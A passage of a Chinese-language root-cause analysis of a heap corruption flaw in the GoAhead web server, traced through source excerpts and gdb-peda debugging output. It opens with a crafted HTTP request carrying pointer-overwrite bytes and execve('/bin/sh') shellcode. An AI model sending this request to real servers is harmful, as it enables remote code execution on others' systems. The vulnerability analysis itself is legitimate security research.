goahead:&nbsp;2:&nbsp;GET&nbsp;/%79%05%08%2F%79%05%08%98%F2%FF%BF%3F%79%05%08AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%04%03%02%01%04%03%02%01%38%78%05%08%38%78%05%08%eb%16%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%eb%19%5e%31%d2%89%56%07%52%56%89%e1%89%f3%31%c0%b0%0b%cd%80%31%db%31%c0%40%cd%80%e8%e2%ff%ff%ff%2f%62%69%6e%2f%73%68/./%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02%02AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&nbsp;HTTP/1.0
***&nbsp;Error&nbsp;in&nbsp;`goahead&#39;:&nbsp;free():&nbsp;corrupted&nbsp;unsorted&nbsp;chunks:&nbsp;0x080622c0&nbsp;***
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，此时已经出发了corrupted unsorted chunks，这个是glibc在新版本后引入用于对抗unlink时指针欺骗的，但是不要紧，这个在利用中是可以绕过的，在分析时我们不关心。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">但是由此可见，这时已经触发了unlink操作，接下来，根据bt回溯情况，来分析整个漏洞的成因。首先从main函数来跟踪一下调用情况，首先是在goahead.c中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(!finished&nbsp;||&nbsp;!*finished)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(socketSelect(-1,&nbsp;delay))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;socketProcess();&nbsp;&nbsp;open&nbsp;a&nbsp;socket&nbsp;process
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先在main函数中，会启用socketProcess，也就是启用Socket进程，接下来进入http.c中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
PUBLIC&nbsp;void&nbsp;socketProcess()
{
&nbsp;&nbsp;&nbsp;&nbsp;WebsSocket&nbsp;&nbsp;&nbsp;&nbsp;*sp;
&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sid;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(sid&nbsp;=&nbsp;0;&nbsp;sid&nbsp;&lt;&nbsp;socketMax;&nbsp;sid++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;((sp&nbsp;=&nbsp;socketList[sid])&nbsp;!=&nbsp;NULL)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(sp-&gt;currentEvents&nbsp;&amp;&nbsp;sp-&gt;handlerMask)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;socketDoEvent(sp);&nbsp;&nbsp;&nbsp;if&nbsp;sid&nbsp;then&nbsp;do&nbsp;event
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
}
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在进程中，会调用一个socket事件，接着往里跟踪。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(sp-&gt;handler&nbsp;&amp;&amp;&nbsp;(sp-&gt;handlerMask&nbsp;&amp;&nbsp;sp-&gt;currentEvents))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(sp-&gt;handler)(sid,&nbsp;sp-&gt;handlerMask&nbsp;&amp;&nbsp;sp-&gt;currentEvents,&nbsp;sp-&gt;handler_data);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Make&nbsp;sure&nbsp;socket&nbsp;pointer&nbsp;is&nbsp;still&nbsp;valid,&nbsp;then&nbsp;reset&nbsp;the&nbsp;currentEvents.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(socketList&nbsp;&amp;&amp;&nbsp;sid&nbsp;&lt;&nbsp;socketMax&nbsp;&amp;&amp;&nbsp;socketList[sid]&nbsp;==&nbsp;sp)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sp-&gt;currentEvents&nbsp;=&nbsp;0;&nbsp;&nbsp;create&nbsp;a&nbsp;socket&nbsp;handler
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里会对sid进程句柄进行一些简单的判断，然后就会进入关键函数调用了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
static&nbsp;bool&nbsp;parseIncoming(Webs&nbsp;*wp)
{
&nbsp;&nbsp;&nbsp;&nbsp;WebsBuf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*rxbuf;
&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*end,&nbsp;c;
&nbsp;&nbsp;&nbsp;&nbsp;rxbuf&nbsp;=&nbsp;&amp;wp-&gt;rxbuf;
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(*rxbuf-&gt;servp&nbsp;==&nbsp;&#39;\r&#39;&nbsp;||&nbsp;*rxbuf-&gt;servp&nbsp;==&nbsp;&#39;\n&#39;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bufGetc(rxbuf);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;((end&nbsp;=&nbsp;strstr((char*)&nbsp;wp-&gt;rxbuf.servp,&nbsp;&quot;\r\n\r\n&quot;))&nbsp;==&nbsp;0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(bufLen(&amp;wp-&gt;rxbuf)&nbsp;&gt;=&nbsp;BIT_GOAHEAD_LIMIT_HEADER)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;websError(wp,&nbsp;HTTP_CODE_REQUEST_TOO_LARGE&nbsp;|&nbsp;WEBS_CLOSE,&nbsp;&quot;Header&nbsp;too&nbsp;large&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;trace(3&nbsp;|&nbsp;WEBS_RAW_MSG,&nbsp;&quot;\n&lt;&lt;&lt;&nbsp;Request\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;=&nbsp;*end;
&nbsp;&nbsp;&nbsp;&nbsp;*end&nbsp;=&nbsp;&#39;\0&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;trace(3&nbsp;|&nbsp;WEBS_RAW_MSG,&nbsp;&quot;%s\n&quot;,&nbsp;wp-&gt;rxbuf.servp);
&nbsp;&nbsp;&nbsp;&nbsp;*end&nbsp;=&nbsp;c;
&nbsp;&nbsp;&nbsp;&nbsp;/*
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Parse&nbsp;the&nbsp;first&nbsp;line&nbsp;of&nbsp;the&nbsp;Http&nbsp;header
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;parseFirstLine(wp);
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在函数中，会调用parseFirstLine函数，这个函数有一个参数，是一个结构体Webs。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
typedef&nbsp;struct&nbsp;Webs&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;WebsBuf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rxbuf;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**&lt;&nbsp;Raw&nbsp;receive&nbsp;buffer&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;WebsBuf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;input;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**&lt;&nbsp;Receive&nbsp;buffer&nbsp;after&nbsp;de-chunking&nbsp;*/
char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*uploadVar;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**&lt;&nbsp;Current&nbsp;upload&nbsp;form&nbsp;variable&nbsp;name&nbsp;*/
……省略一大部分定义
#endif
&nbsp;&nbsp;&nbsp;&nbsp;void&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*ssl;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**&lt;&nbsp;SSL&nbsp;context&nbsp;*/
}&nbsp;Webs;
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这个Webs结构体其实包含了整个Web Server服务端需要的变量，那么继续往里跟踪。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
static&nbsp;void&nbsp;parseFirstLine(Webs&nbsp;*wp)
{
&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp;&nbsp;&nbsp;*op,&nbsp;*protoVer,&nbsp;*url,&nbsp;*host,&nbsp;*query,&nbsp;*path,&nbsp;*port,&nbsp;*ext,&nbsp;*buf;
&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;testPort;
&nbsp;&nbsp;&nbsp;^^^^
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(websGetLogLevel()&nbsp;==&nbsp;2)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;host&nbsp;=&nbsp;path&nbsp;=&nbsp;port&nbsp;=&nbsp;query&nbsp;=&nbsp;ext&nbsp;=&nbsp;NULL;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(websUrlParse(url,&nbsp;&amp;buf,&nbsp;NULL,&nbsp;&amp;host,&nbsp;&amp;port,&nbsp;&amp;path,&nbsp;&amp;ext,&nbsp;NULL,&nbsp;&amp;query)&nbsp;&lt;&nbsp;0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error(&quot;Cannot&nbsp;parse&nbsp;URL:&nbsp;%s&quot;,&nbsp;url);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;websError(wp,&nbsp;HTTP_CODE_BAD_REQUEST&nbsp;|&nbsp;WEBS_CLOSE&nbsp;|&nbsp;WEBS_NOLOG,&nbsp;&quot;Bad&nbsp;URL&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;((wp-&gt;path&nbsp;=&nbsp;websNormalizeUriPath(path))&nbsp;==&nbsp;0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error(&quot;Cannot&nbsp;normalize&nbsp;URL:&nbsp;%s&quot;,&nbsp;url);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;websError(wp,&nbsp;HTTP_CODE_BAD_REQUEST&nbsp;|&nbsp;WEBS_CLOSE&nbsp;|&nbsp;WEBS_NOLOG,&nbsp;&quot;Bad&nbsp;URL&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wfree(buf);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;
&nbsp;&nbsp;&nbsp;&nbsp;}
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">根据我们上面的回溯部分，可以看到函数中websNormalizeUriPath函数是漏洞触发的主要函数，它的参数path是数据包中我们构造的畸形字符串，而它又是从哪里来的呢？</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">注意一下上面的websUrlParse函数，中间会对path进行处理，下面动态调试。在websUrlParse下断点。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
gdb-peda$&nbsp;b&nbsp;websUrlParse
Breakpoint&nbsp;1&nbsp;at&nbsp;0xb7fb5fd0:&nbsp;file&nbsp;src/http.c,&nbsp;line&nbsp;3027.
gdb-peda$&nbsp;c
Continuing.
[----------------------------------registers-----------------------------------]
EAX:&nbsp;0xbffff2c0&nbsp;--&gt;&nbsp;0xbffff320&nbsp;--&gt;&nbsp;0x2&nbsp;
EBX:&nbsp;0xb7fd8480&nbsp;--&gt;&nbsp;0x30328&nbsp;
ECX:&nbsp;0xb7eec420&nbsp;--&gt;&nbsp;0x0&nbsp;
EDX:&nbsp;0x0&nbsp;
ESI:&nbsp;0x805ddd3&nbsp;(&quot;HTTP/1.0&quot;)
EDI:&nbsp;0xb7fd94ec&nbsp;--&gt;&nbsp;0x2&nbsp;
EBP:&nbsp;0x805d8ac&nbsp;(&quot;/%79%05%08%2F%79%05%08%98%F2%FF%BF%3F%79%05%08&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;154&nbsp;times&gt;...)
ESP:&nbsp;0xbffff25c&nbsp;--&gt;&nbsp;0xb7fb8a9c&nbsp;(&lt;websPump+4572&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;esp,0x30)
EIP:&nbsp;0xb7fb5fd0&nbsp;(&lt;websUrlParse&gt;:&nbsp;push&nbsp;&nbsp;&nbsp;ebp)
EFLAGS:&nbsp;0x246&nbsp;(carry&nbsp;PARITY&nbsp;adjust&nbsp;ZERO&nbsp;sign&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)
[-------------------------------------code-------------------------------------]
&nbsp;&nbsp;&nbsp;0xb7fb5fcd:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;0xb7fb5fce:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;0xb7fb5fcf:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
=&gt;&nbsp;0xb7fb5fd0&nbsp;&lt;websUrlParse&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;ebp
&nbsp;&nbsp;&nbsp;0xb7fb5fd1&nbsp;&lt;websUrlParse+1&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;edi
&nbsp;&nbsp;&nbsp;0xb7fb5fd2&nbsp;&lt;websUrlParse+2&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;esi
&nbsp;&nbsp;&nbsp;0xb7fb5fd3&nbsp;&lt;websUrlParse+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;ebx
&nbsp;&nbsp;&nbsp;0xb7fb5fd4&nbsp;&lt;websUrlParse+4&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;0xb7fae4a0&nbsp;&lt;__x86.get_pc_thunk.bx&gt;
[------------------------------------stack-------------------------------------]
0000|&nbsp;0xbffff25c&nbsp;--&gt;&nbsp;0xb7fb8a9c&nbsp;(&lt;websPump+4572&gt;:&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;esp,0x30)
0004|&nbsp;0xbffff260&nbsp;--&gt;&nbsp;0x805d8ac&nbsp;(&quot;/%79%05%08%2F%79%05%08%98%F2%FF%BF%3F%79%05%08&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;154&nbsp;times&gt;...)
0008|&nbsp;0xbffff264&nbsp;--&gt;&nbsp;0xbffff2c0&nbsp;--&gt;&nbsp;0xbffff320&nbsp;--&gt;&nbsp;0x2&nbsp;
0012|&nbsp;0xbffff268&nbsp;--&gt;&nbsp;0x0&nbsp;
0016|&nbsp;0xbffff26c&nbsp;--&gt;&nbsp;0xbffff2ac&nbsp;--&gt;&nbsp;0x0&nbsp;
0020|&nbsp;0xbffff270&nbsp;--&gt;&nbsp;0xbffff2b8&nbsp;--&gt;&nbsp;0x0&nbsp;
0024|&nbsp;0xbffff274&nbsp;--&gt;&nbsp;0xbffff2b4&nbsp;--&gt;&nbsp;0x0&nbsp;
0028|&nbsp;0xbffff278&nbsp;--&gt;&nbsp;0xbffff2bc&nbsp;--&gt;&nbsp;0x0&nbsp;
[------------------------------------------------------------------------------]
Legend:&nbsp;code,&nbsp;data,&nbsp;rodata,&nbsp;value
Breakpoint&nbsp;1,&nbsp;websUrlParse&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;url=0x805d8ac&nbsp;&quot;/%79%05%08%2F%79%05%08%98%F2%FF%BF%3F%79%05%08&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;154&nbsp;times&gt;...,&nbsp;pbuf=0xbffff2c0,&nbsp;pprotocol=0x0,&nbsp;phost=0xbffff2ac,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;pport=0xbffff2b8,&nbsp;ppath=0xbffff2b4,&nbsp;pext=0xbffff2bc,&nbsp;preference=0x0,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;pquery=0xbffff2b0)&nbsp;at&nbsp;src/http.c:3027
3027&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
gdb-peda$&nbsp;x/10x&nbsp;0xbffff2b4
0xbffff2b4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffff320
0xbffff2c4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xb7fecc9f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xb7fdbb00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000001
0xbffff2d4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，此时url已经传入了畸形字符串，函数中，会对这个字符串进行各种处理，把它们处理后交给其他输出变量。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">注意bffff2b4处的变量。接下来直接执行到函数返回的位置。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
gdb-peda$&nbsp;b&nbsp;*0xb7fb61be
Breakpoint&nbsp;2&nbsp;at&nbsp;0xb7fb61be:&nbsp;file&nbsp;src/http.c,&nbsp;line&nbsp;3162.
gdb-peda$&nbsp;c
Continuing.
[----------------------------------registers-----------------------------------]
EAX:&nbsp;0x0&nbsp;
EBX:&nbsp;0xb7fd8480&nbsp;--&gt;&nbsp;0x30328&nbsp;
ECX:&nbsp;0xbffff2b0&nbsp;--&gt;&nbsp;0xb7fc90f7&nbsp;--&gt;&nbsp;0x74746800&nbsp;(&#39;&#39;)
EDX:&nbsp;0x0&nbsp;
ESI:&nbsp;0x805ddd3&nbsp;(&quot;HTTP/1.0&quot;)
EDI:&nbsp;0xb7fd94ec&nbsp;--&gt;&nbsp;0x2&nbsp;
EBP:&nbsp;0x805d8ac&nbsp;(&quot;/%79%05%08%2F%79%05%08%98%F2%FF%BF%3F%79%05%08&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;154&nbsp;times&gt;...)
ESP:&nbsp;0xbffff25c&nbsp;--&gt;&nbsp;0xb7fb8a9c&nbsp;(&lt;websPump+4572&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;esp,0x30)
EIP:&nbsp;0xb7fb61be&nbsp;(&lt;websUrlParse+494&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret)
EFLAGS:&nbsp;0x282&nbsp;(carry&nbsp;parity&nbsp;adjust&nbsp;zero&nbsp;SIGN&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)
[-------------------------------------code-------------------------------------]
&nbsp;&nbsp;&nbsp;0xb7fb61bb&nbsp;&lt;websUrlParse+491&gt;:&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;esi
&nbsp;&nbsp;&nbsp;0xb7fb61bc&nbsp;&lt;websUrlParse+492&gt;:&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;edi
&nbsp;&nbsp;&nbsp;0xb7fb61bd&nbsp;&lt;websUrlParse+493&gt;:&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;ebp
=&gt;&nbsp;0xb7fb61be&nbsp;&lt;websUrlParse+494&gt;:&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;0xb7fb61bf&nbsp;&lt;websUrlParse+495&gt;:&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;0xb7fb61c0&nbsp;&lt;websUrlParse+496&gt;:&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;eax,[ebp+0x7]
&nbsp;&nbsp;&nbsp;0xb7fb61c3&nbsp;&lt;websUrlParse+499&gt;:&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;BYTE&nbsp;PTR&nbsp;[ebp+0x4],0x0
&nbsp;&nbsp;&nbsp;0xb7fb61c7&nbsp;&lt;websUrlParse+503&gt;:&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;edx,DWORD&nbsp;PTR&nbsp;[esp+0xc]
[------------------------------------stack-------------------------------------]
0000|&nbsp;0xbffff25c&nbsp;--&gt;&nbsp;0xb7fb8a9c&nbsp;(&lt;websPump+4572&gt;:&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;esp,0x30)
0004|&nbsp;0xbffff260&nbsp;--&gt;&nbsp;0x805d8ac&nbsp;(&quot;/%79%05%08%2F%79%05%08%98%F2%FF%BF%3F%79%05%08&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;154&nbsp;times&gt;...)
